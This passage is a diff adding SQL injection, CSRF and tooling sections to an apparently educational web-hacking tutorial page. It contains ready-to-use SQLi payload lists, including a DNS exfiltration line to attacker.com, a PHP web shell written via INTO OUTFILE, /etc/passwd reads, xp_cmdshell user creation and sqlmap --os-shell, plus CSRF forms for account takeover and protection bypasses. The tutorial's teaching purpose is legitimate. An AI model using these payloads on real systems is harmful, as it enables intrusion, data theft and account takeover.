+                    <p>No data shown, but page behaves differently based on true/false. Slow data extraction.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># If first char of password = 'a'
+' AND SUBSTRING(password,1,1)='a'--
+
+# Page different? We guessed correctly!</div>
+                </div>
+                <div class="card">
+                    <h4>⏱️ Blind SQLi (Time-based)</h4>
+                    <p>Use SLEEP() - if page delays, condition was true. Slowest but works when all else fails.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># If condition true, wait 5 seconds
+' OR IF(1=1,SLEEP(5),0)--
+
+# 5 second delay = condition true!</div>
+                </div>
+                <div class="card">
+                    <h4>📡 Out-of-Band SQLi</h4>
+                    <p>Exfiltrate data via DNS or HTTP requests to attacker's server. When other methods fail.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># MySQL - DNS exfil
+' UNION SELECT LOAD_FILE(
+  CONCAT('\\\\',password,'.attacker.com\\a')
+) FROM users--</div>
+                </div>
+            </div>
+
+            <h3>SQLi Payloads Reference</h3>
+            <div class="code"># ==================== DETECTION PAYLOADS ====================
+
+'                       # Single quote - causes error if vulnerable
+''                      # Two quotes - should NOT cause error
+' OR '1'='1             # Always true
+' OR '1'='2             # Always false (compare response)
+' AND '1'='1            # True condition
+' AND '1'='2            # False condition
+1 OR 1=1                # Numeric context
+1 AND 1=2               # Numeric false
+
+# ==================== AUTHENTICATION BYPASS ====================
+
+admin' --
+admin' #                                # MySQL comment
+admin'/*                                # Multi-line comment
+' OR 1=1--
+' OR 'x'='x
+') OR ('1'='1
+' OR ''='
+' OR 1=1#
+
+# ==================== UNION-BASED DATA EXTRACTION ====================
+
+# Step 1: Find number of columns
+' ORDER BY 1--          # Works
+' ORDER BY 2--          # Works
+' ORDER BY 3--          # Error! So there are 2 columns
+
+# Alternative method:
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--         # This one works!
+
+# Step 2: Find visible columns
+' UNION SELECT 'a',NULL,NULL--          # See which column displays 'a'
+
+# Step 3: Extract data
+' UNION SELECT username,password,NULL FROM users--
+
+# ==================== DATABASE ENUMERATION ====================
+
+# MySQL
+' UNION SELECT @@version,NULL--                     # Version
+' UNION SELECT database(),NULL--                    # Current DB
+' UNION SELECT user(),NULL--                        # Current user
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# PostgreSQL
+' UNION SELECT version(),NULL--
+' UNION SELECT current_database(),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# MSSQL
+' UNION SELECT @@version,NULL--
+' UNION SELECT DB_NAME(),NULL--
+' UNION SELECT name,NULL FROM sysdatabases--
+
+# Oracle
+' UNION SELECT banner,NULL FROM v$version--
+' UNION SELECT table_name,NULL FROM all_tables--
+
+# ==================== TIME-BASED BLIND ====================
+
+# MySQL
+' OR SLEEP(5)--
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--
+
+# PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# ==================== FILE ACCESS (MySQL) ====================
+
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT "<?php system($_GET['c']); ?>",NULL INTO OUTFILE '/var/www/shell.php'--
+
+# ==================== COMMAND EXECUTION ====================
+
+# MSSQL (if xp_cmdshell enabled)
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'net user hacker pass123 /add'--
+
+# Enable xp_cmdshell
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--</div>
+
+            <div class="warning-box">
+                <h4>🛠️ SQLMap - Automated SQLi Tool</h4>
+                <p><span class="inline-code">sqlmap</span> automates SQL injection detection and exploitation:</p>
+                <div class="code" style="margin-top: 1rem; font-size: 0.8rem;"># Basic test
+sqlmap -u "http://target.com/page?id=1"
+
+# With POST data
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
+
+# Dump database
+sqlmap -u "http://target.com/page?id=1" --dbs              # List databases
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # List tables
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump  # Dump table
+
+# Get shell
+sqlmap -u "http://target.com/page?id=1" --os-shell</div>
+            </div>
+        </section>
+
+        <section id="csrf" class="section">
+            <h2 class="section-title">Cross-Site Request Forgery (CSRF)</h2>
+            <p class="section-intro">CSRF tricks victims into performing actions they didn't intend by exploiting the browser's automatic inclusion of cookies on cross-origin requests. If you're logged into your bank and visit a malicious page, that page can transfer money from your account without you knowing.</p>
+
+            <div class="metaphor-box">
+                <h4>✉️ The Forged Letter Metaphor</h4>
+                <p>Imagine you're a king who trusts any letter with your royal seal. CSRF is like someone tricking you into putting your seal on a blank piece of paper, then writing whatever orders they want above your signature. The kingdom (website) sees your seal and follows the orders, not knowing they weren't really from you.</p>
+            </div>
+
+            <h3>How CSRF Works</h3>
+            <div class="code"># ==================== THE ATTACK SCENARIO ====================
+
+1. Victim logs into bank.com
+   - Browser stores session cookie: session=abc123xyz
+
+2. Victim (still logged in) visits evil.com
+
+3. evil.com contains hidden attack code:
+   &lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;
+
+4. What happens:
+   - Browser makes GET request to bank.com
+   - Browser AUTOMATICALLY includes bank.com cookies!
+   - Bank sees authenticated request from victim
+   - Bank thinks victim wants to transfer money
+   - $10,000 goes to attacker
+
+# ==================== WHY IT WORKS ====================
+
+- Same-Origin Policy blocks evil.com from READING bank.com responses
+- But SOP does NOT block evil.com from SENDING requests to bank.com
+- Cookies are automatically included on any request to their domain
+- Bank can't distinguish between legitimate and forged requests
+
+# ==================== MORE DANGEROUS: POST REQUESTS ====================
+
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf-form"&gt;
+  &lt;input type="hidden" name="to" value="attacker_account"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById('csrf-form').submit();
+&lt;/script&gt;
+
+# Victim visits evil.com → Form auto-submits → Money transferred!
+
+# ==================== REAL-WORLD EXAMPLES ====================
+
+# Change email (for account takeover)
+&lt;form action="https://target.com/settings/email" method="POST"&gt;
+  &lt;input name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+
+# Change password
+&lt;form action="https://target.com/settings/password" method="POST"&gt;
+  &lt;input name="new_password" value="hacked123"&gt;
+  &lt;input name="confirm_password" value="hacked123"&gt;
+&lt;/form&gt;
+
+# Add admin user
+&lt;form action="https://admin.target.com/users/create" method="POST"&gt;
+  &lt;input name="username" value="backdoor"&gt;
+  &lt;input name="role" value="admin"&gt;
+&lt;/form&gt;
+
+# Delete account
+&lt;form action="https://target.com/account/delete" method="POST"&gt;
+  &lt;input name="confirm" value="yes"&gt;
+&lt;/form&gt;</div>
+
+            <h3>CSRF Attack Variations</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🖼️ Image Tag</h4>
+                    <p>Simple GET request attacks. Limited but works for poorly designed sites.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;">&lt;img src="https://bank.com/transfer?to=attacker&amount=100"&gt;
+
+# Invisible, auto-loads</div>
+                </div>
+                <div class="card">
+                    <h4>📝 Auto-submitting Form</h4>
+                    <p>For POST-based actions. Most common CSRF attack.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;">&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="target" method="POST"&gt;
+    &lt;input name="action" value="bad"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;</div>
+                </div>
+                <div class="card">
+                    <h4>🔗 Link-based</h4>
+                    <p>Requires victim to click. Can be disguised.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;">&lt;a href="https://bank.com/transfer?to=attacker&amount=100"&gt;
+  Click for free iPhone!
+&lt;/a&gt;</div>
+                </div>
+                <div class="card">
+                    <h4>📡 AJAX-based</h4>
+                    <p>More complex, requires CORS misconfiguration.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;">&lt;script&gt;
+fetch('https://target.com/api/action', {
+  method: 'POST',
+  credentials: 'include',
+  body: 'malicious=data'
+});
+&lt;/script&gt;</div>
+                </div>
+            </div>
+
+            <h3>CSRF Protection Methods</h3>
+            <div class="code"># ==================== CSRF TOKENS (Primary Defense) ====================
+
+# Server generates random token, includes in form:
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="csrf_token" value="j8h2f9d8h2f9d8h2f9..."&gt;
+  &lt;input name="to" value="..."&gt;
+  &lt;input name="amount" value="..."&gt;
+&lt;/form&gt;
+
+# Server validates token matches session
+# Attacker can't guess the token!
+
+# BUT: If there's XSS, attacker can READ the token from the page!
+
+# ==================== SAMESITE COOKIES (Modern Defense) ====================
+
+Set-Cookie: session=abc123; SameSite=Strict
+# Cookie NOT sent on cross-site requests
+
+Set-Cookie: session=abc123; SameSite=Lax
+# Cookie sent on top-level navigations (links)
+# NOT sent on form submissions, AJAX, images
+
+# SameSite=None (DANGEROUS - must have Secure)
+Set-Cookie: session=abc123; SameSite=None; Secure
+# Sent on ALL requests - provides no CSRF protection
+
+# ==================== OTHER DEFENSES ====================
+
+# Origin/Referer header checking
+# Server checks if Origin/Referer header matches expected
+# Can be bypassed in some scenarios
+
+# Re-authentication for sensitive actions
+# Require password confirmation for changes
+# Good for high-value actions
+
+# Custom headers (for AJAX)
+# AJAX can set custom headers, forms cannot
+fetch('/api/transfer', {
+  headers: { 'X-Requested-With': 'XMLHttpRequest' }
+});
+# Server rejects requests without custom header
+
+# ==================== BYPASSING CSRF PROTECTION ====================
+
+# Token not validated on server
+# Try removing the token parameter entirely
+
+# Token tied to wrong session
+# Use another user's token
+
+# Token in cookie (mirrored)
+# If csrf_cookie = csrf_param, try setting both
+
+# Referrer not checked properly
+# Try empty referrer, null origin
+
+# Method confusion
+# Change POST to GET (or vice versa)</div>
+
+            <h3>Finding CSRF Vulnerabilities</h3>
+            <div class="info-box">
+                <h4>CSRF Testing Checklist</h4>
+                <ul style="margin-top: 1rem;">
+                    <li>✓ Identify state-changing actions (transfer money, change email, delete account)</li>
+                    <li>✓ Check if CSRF token exists in forms</li>
+                    <li>✓ Try removing the CSRF token - does the request still work?</li>
+                    <li>✓ Try changing the CSRF token to a random value</li>
+                    <li>✓ Try using a CSRF token from another user's session</li>
+                    <li>✓ Check if action works via GET (change POST to GET)</li>
+                    <li>✓ Check SameSite cookie attribute (if None or missing = vulnerable)</li>
+                    <li>✓ Test from an attacker-controlled page with the forged request</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="tools" class="section">
+            <h2 class="section-title">Essential Web Hacking Tools</h2>
+            <p class="section-intro">These are the tools every web hacker uses daily. Master them and you'll be able to find vulnerabilities that automated scanners miss. The right tool doesn't make you a hacker - understanding how to use it does.</p>
+
+            <div class="metaphor-box">
+                <h4>🔧 The Craftsman's Toolbox</h4>
+                <p>A carpenter doesn't just own a hammer - they know exactly when to use a hammer vs. a screwdriver vs. a saw. Similarly, a web hacker needs to know when to use Burp vs. curl vs. the browser's dev tools. The tool should be an extension of your thinking, not a replacement for it.</p>
+            </div>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🔵 Burp Suite</h4>
+                    <p>The ultimate web proxy. Industry standard for penetration testers. Intercept, modify, and replay HTTP requests. Essential for finding and exploiting vulnerabilities.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Proxy: Intercept all traffic</li>
+                        <li>Repeater: Manual testing</li>
+                        <li>Intruder: Automated attacks</li>
+                        <li>Scanner: Vuln scanning (Pro only)</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🟢 OWASP ZAP</h4>
+                    <p>Free alternative to Burp. Great for beginners. Includes automated scanning and active attack capabilities.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>100% free and open source</li>
+                        <li>Built-in automated scanner</li>
+                        <li>HUD for in-browser testing</li>
+                        <li>Active community</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>💉 SQLMap</h4>
+                    <p>Automated SQL injection tool. Detects, exploits, and dumps databases. Can also get OS shell access.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Supports many databases</li>
+                        <li>Automatic bypass techniques</li>
+                        <li>Database takeover features</li>
+                        <li>File read/write capabilities</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🔍 Nikto</h4>
+                    <p>Web server scanner. Finds misconfigurations, outdated software, dangerous files, and common vulnerabilities.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>6,700+ potentially dangerous files</li>
+                        <li>Server version detection</li>
+                        <li>Multiple output formats</li>
+                        <li>Fast initial recon</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📁 Gobuster / Dirbuster / Feroxbuster</h4>
+                    <p>Directory and file bruteforcing. Find hidden admin panels, backup files, config files, and forgotten endpoints.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Fast multi-threaded</li>
+                        <li>Recursive scanning</li>
+                        <li>Custom wordlists</li>
+                        <li>Extension bruteforcing</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🛠️ Browser DevTools</h4>
+                    <p>Built into every browser. Inspect requests, modify DOM, debug JavaScript. Free and surprisingly powerful.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Network tab: See all requests</li>
+                        <li>Console: Run JavaScript</li>
+                        <li>Elements: Modify DOM</li>
+                        <li>Application: Cookies/storage</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>🌐 Nmap</h4>
+                    <p>Network scanner. Find web servers, identify technologies, check for vulnerabilities with NSE scripts.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Port scanning</li>
+                        <li>Service detection</li>
+                        <li>HTTP enumeration scripts</li>
+                        <li>Vulnerability scanning</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📝 Wfuzz / ffuf</h4>
+                    <p>Web fuzzer. Test parameters, headers, paths with custom payloads. More flexible than directory bruteforcing.</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Fuzz any part of request</li>
+                        <li>Filter responses</li>
+                        <li>Multiple wordlists</li>
+                        <li>Fast and efficient</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Getting Started with Burp Suite</h3>
+            <div class="code"># ==================== INSTALLATION & SETUP ====================
+
+# 1. Download Burp Suite Community (free) from portswigger.net
+# 2. Configure browser to use Burp proxy:
+#    Settings → Proxy → Manual → HTTP Proxy: 127.0.0.1, Port: 8080
+# 3. Visit http://burp and download CA certificate
+# 4. Install certificate in browser (for HTTPS interception)
+
+# ==================== BURP SUITE TABS ====================
+
+# TARGET TAB
+# - Site map: All discovered URLs
+# - Scope: Define what's in/out of testing
+# - Right-click → Add to scope
+
+# PROXY TAB
+# - Intercept: Catch and modify requests in real-time
+# - HTTP history: All requests/responses
+# - Options: Configure proxy settings
+# Toggle intercept: "Intercept is on/off" button
+
+# REPEATER TAB
+# - Send requests manually
+# - Modify and resend
+# - Compare responses
+# - Right-click request → "Send to Repeater"
+
+# INTRUDER TAB
+# - Automated attacks
+# - Bruteforce, fuzzing, enumeration
+# - Define payload positions with §markers§
+# - Attack types: Sniper, Battering Ram, Pitchfork, Cluster Bomb
+
+# DECODER TAB
+# - Encode/decode data
+# - Base64, URL, HTML, Hex, etc.
+# - Smart decode
+
+# COMPARER TAB
+# - Diff two responses
+# - Find subtle differences
+# - Good for blind testing
+
+# ==================== BASIC WORKFLOW ====================
+
+# 1. Set scope
+#    Target → Scope → Add target domain
+
+# 2. Spider the site
+#    Browse with intercept OFF
+#    Or: Target → Site map → Right-click → Spider this host
+
+# 3. Review interesting endpoints
+#    Look for: login pages, APIs, file uploads, search, user input
+
+# 4. Test in Repeater
+#    Right-click request → Send to Repeater
+#    Modify parameters, test payloads
+#    Analyze responses
+
+# 5. Automate with Intruder
+#    Right-click request → Send to Intruder
+#    Clear § → Add § around payload positions
+#    Payloads tab → Load wordlist
+#    Start attack
+
+# ==================== PRO TIPS ====================
+
+# Keyboard shortcuts:
+Ctrl+R = Send to Repeater
+Ctrl+I = Send to Intruder
+Ctrl+G = Go to (navigate request history)
+
+# Save everything:
+Project → Save project as...
+
+# Extensions:
+Extender tab → BApp Store
+Must-have: Logger++, Autorize, JWT Editor, Turbo Intruder</div>
+
+            <h3>Command Line Tools</h3>
+            <div class="code"># ==================== CURL - HTTP SWISS ARMY KNIFE ====================
+
+curl https://target.com                     # GET request
+curl -v https://target.com                  # Verbose (see headers)
+curl -I https://target.com                  # Headers only
+curl -X POST https://target.com/api         # POST request
+curl -d "user=admin&pass=123" URL           # POST data
+curl -H "Cookie: session=abc" URL           # Custom header
+curl -H "Content-Type: application/json" \
+     -d '{"user":"admin"}' URL              # JSON POST
+curl -b cookies.txt -c cookies.txt URL      # Handle cookies
+curl -x http://127.0.0.1:8080 URL           # Through Burp proxy
+curl --data-urlencode "param=<script>" URL  # URL encode data
+
+# ==================== FFUF - FAST WEB FUZZER ====================
+
+# Directory bruteforce
+ffuf -w /path/wordlist.txt -u https://target.com/FUZZ
+
+# Parameter fuzzing
+ffuf -w params.txt -u https://target.com/page?FUZZ=value
+
+# POST parameter fuzzing
+ffuf -w wordlist.txt -X POST -d "param=FUZZ" -u https://target.com
+
+# Filter by response size
+ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 1234
+
+# Filter by status code
+ffuf -w wordlist.txt -u https://target.com/FUZZ -fc 404
+
+# ==================== GOBUSTER - DIRECTORY BRUTEFORCE ====================
+
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt
+gobuster dns -d target.com -w subdomains.txt
+
+# ==================== SQLMAP - SQL INJECTION ====================
+
+sqlmap -u "http://target.com/page?id=1"
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database --tables
+sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
+sqlmap -r request.txt                       # From saved Burp request
+
+# ==================== NIKTO - WEB SERVER SCANNER ====================
+
+nikto -h https://target.com
+nikto -h https://target.com -o output.html -Format html
+
+# ==================== WFUZZ - WEB FUZZER ====================
+
+wfuzz -c -z file,wordlist.txt https://target.com/FUZZ
+wfuzz -c -z file,wordlist.txt -d "user=admin&pass=FUZZ" https://target.com/login
+wfuzz --hc 404 -z file,wordlist.txt https://target.com/FUZZ</div>
+
+            <h3>Practice Platforms</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🎓 PortSwigger Web Security Academy</h4>
+                    <p>Free labs covering all web vulnerabilities. Made by Burp Suite creators. Best structured learning path.</p>
+                </div>
+                <div class="card">
+                    <h4>🎯 HackTheBox</h4>
+                    <p>Realistic machines to hack. Web challenges and full machines with web components. Great for practical skills.</p>
+                </div>
+                <div class="card">
+                    <h4>🔒 OWASP WebGoat</h4>
+                    <p>Deliberately vulnerable app to practice. Guided lessons for each vulnerability type.</p>
+                </div>
+                <div class="card">
+                    <h4>🐛 Bug Bounty Programs</h4>
+                    <p>HackerOne, Bugcrowd, Intigriti. Real targets with legal authorization. Get paid for finding bugs!</p>
                 </div>
             </div>
         </section>
+
+        <div style="margin-top: 6rem; padding-top: 3rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between;">
+            <a href="hacking-ch03.html" style="color: var(--text2); text-decoration: none;">← Chapter 03: Linux Mastery</a>
+            <a href="hacking-ch05.html" style="color: var(--text); text-decoration: none; font-weight: 600;">Next: Chapter 05 - Exploitation →</a>
+        </div>
     </main>
 
     <script>
@@ -525,6 +1834,26 @@ tcpdump -i eth0 -A | grep "Cookie:"
             const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
             const scrolled = (winScroll / height) * 100;
             document.getElementById('progress').style.width = scrolled + '%';
+        });
+
+        const sections = document.querySelectorAll('.section');
+        const sidebarLinks = document.querySelectorAll('.sidebar-link');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= (sectionTop - 150)) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            sidebarLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === `#${current}`) {
+                    link.classList.add('active');
+                }
+            });
         });
     </script>
 </body>
